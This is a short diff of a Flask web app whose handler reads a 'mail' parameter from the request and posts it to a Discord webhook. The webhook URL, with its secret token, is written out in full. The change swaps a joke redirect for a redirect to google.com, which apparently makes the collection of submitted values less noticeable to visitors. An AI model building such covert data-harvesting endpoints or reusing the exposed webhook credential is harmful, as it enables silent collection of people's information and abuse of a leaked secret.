@@ -16,7 +16,7 @@ def idk_wtf():
     param = request.args.get('mail')
     discord = Discord(url="https://discord.com/api/webhooks/1217552500605849671/yzRXq3s_o4d424amxpcuqUgvNbQAkFiH-nYqfcFF--jxovQ1hdNtXv6j7BgtUbG7PwOf")
     discord.post(content=param)
-    return redirect('https://youtu.be/dQw4w9WgXcQ?si=OaCK87AT_3Hx1WAS')
+    return redirect('https://google.com')
 
 # Run the Flask application
 if __name__ == '__main__':
